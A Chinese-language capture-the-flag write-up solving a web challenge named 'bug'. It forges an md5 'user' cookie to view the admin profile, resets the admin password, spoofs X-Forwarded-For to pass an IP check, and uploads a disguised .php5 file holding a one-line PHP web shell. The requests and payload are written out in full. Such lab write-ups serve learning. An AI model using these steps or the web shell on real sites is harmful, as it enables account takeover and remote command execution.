# bug

## 解题思路：

- 打开网页，发现是一个用户登录页面，仍然先尝试能不能SQL注入： `' or 1=1 #` ，服务器无回复，说明不太行，但注意到get传参为 ： `module=login` ；同时在输入框下方还有 `register` 和 `findpwd` 两个选项，注册功能要求填写用户名，生日，密码以及地址，找回密码功能要求填写用户名，生日，以及地址。

- 先去注册，在注册页面同样尝试能否SQL注入，仍然不行，但注意到get传参变为 `module=register` 。

- 注册完成，登录进去后发现有五个选项卡，分别对应五个get参数： 没有module， `module=admin` , `module=member&uid=5` , `module=logout` 。

    其中 `module=admin` 选项卡要求我们具有管理员权限才可以浏览，  `module=member&uid=5` 显示了我们的注册信息（UID，用户名，生日，以及地址），这时考虑到：我们是否可以用admin的注册信息来修改admin的密码呢？

- 利用burp suite抓包，发现我们点击 `module=member&uid=5` 时，我们的包内对应内容如下：

    ```http
    GET /index.php?module=index&do=member&uid=5 HTTP/1.1
    ...
    Cookie: PHPSESSID=ho3cb5vcv50ac7vojv151relp7; user=5b3cec1e8447de26979d3b8250ff0b4d
    ```

    一开始我也不知道这个要怎么用，但是看了大佬的write up之后知道了，这个user其实是 `uid:用户名` 的组合体经过md5加密后的产物，那我们就随便在网上找一个md5加密网站，给他加密一下，再改一下uid：

    ```http
    GET /index.php?module=index&do=member&uid=1 HTTP/1.1
    ...
    Cookie: PHPSESSID=ho3cb5vcv50ac7vojv151relp7; user=4b9987ccafacb8d8fc08d22bbca797ba
    ```

    发给服务器，发现服务器真的回应了管理员的 `module=member` 界面：

    ```html
        <div class="wbox">
        <div class="switchTab clearfix">
            <a href="index.php" id="home">Home</a>
            <a href="index.php?module=admin">Manage</a>
            <a href="index.php?module=index&do=member&uid=5" id="member">Personal</a>
            <a href="index.php?module=index&do=newpwd" id="newpwd">Change Pwd</a>
            <a href="index.php?module=index&do=logout">Logout</a>
        </div>
        <div class="container">
            <table cellspacing="0" class="profileTable" cellpadding="0" border="0">
        <tr><td width="70">UID</td>
            <td>1</td>
        </tr>
        <tr><td width="70">Username</td>
            <td>admin</td>
        </tr>
        <tr><td width="70">Birthday</td>
            <td>1993/01/01</td>
        </tr>
        <tr><td width="70">Address</td>
            <td>福建省福州市闽侯县</td>
        </tr>
        </table>
            </div>
    </div>
    ```

    东西全拿到了，我们现在就回到 `findpwd` 页面去试试改管理员的密码，输入全部信息后，服务器成功让我们改密码了，我们直接改成 `123456`

    之后用 `admin` 和 `123456` 登录，成功，直奔 `module=admin` ，发现它说 `IP not allowed` ，那简单，抓包改成127.0.0.1：

    - `X-Forwarded-For: 127.0.0.1`

    服务器回应：

    ```html
    <div class="wbox">
	<div class="container">
		<p>Where Is The Flag?</p>
		<p style="font-size:100px">: )</p>
	</div>
    </div>
    <!-- index.php?module=filemanage&do=???-->
    </body>
    </html>
    ```

    告诉我们flag就在 `<!-- index.php?module=filemanage&do=???-->` 这个命令里

    这里我实在没想到要 `upload` ，只好看别人的writeup才知道。

        这里也是一个注意点：filemnage总共也就这几种：edit,dir,list,upload,delete ，多试试总能试出来的。

    访问 `index.php?module=filemanage&do=upload` ，发现是上传文件，这里的上传很恶心，一句话木马里包含了 `<?php ?> ` 的一概拦截，不让我们的上传文件里出现这个，而且要求我们必须上传格式为图片。

    看了大佬的笔记，发现可以用 php 文档中的 tag<scriptlanguage=”php”></script> 绕过 同时修改文件拓展 类型 和标签：

    ```http
    -----------------------------18467633426500
    Content-Disposition: form-data; name="upfile"; filename="index.php5"
    Content-Type: image/jpeg

    <script language="php">system($_GET[a]);</script>
    -----------------------------18467633426500--
    ```

    一个是伪造了 `Content-Type: image/jpeg` ，一个是伪造了 `"index.php5"` ，最后就是上传一句话木马 `<script language="php">system($_GET[a]);</script>` ，终于拿到了flag。